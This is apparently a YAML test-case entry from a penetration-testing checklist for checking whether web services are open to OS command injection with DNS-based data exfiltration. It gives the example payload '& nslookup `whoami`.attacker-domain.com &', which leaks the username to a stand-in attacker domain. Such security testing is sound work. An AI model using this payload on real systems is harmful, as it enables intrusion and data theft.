---
testcase: Test if a Web (HTTP/HTTPS) service allows exfiltration of data using DNS by injecting a payload like & nslookup `whoami`.attacker-domain.com &
platforms: 
  - Web
  - Network
methodology: 
  - BlackBox
  - GreyBox
owasp-catgeory:
  - 
vulnerabilities:
  - Command injection
services:
  - WEB
references:
  - https://portswigger.net/web-security/os-command-injection
---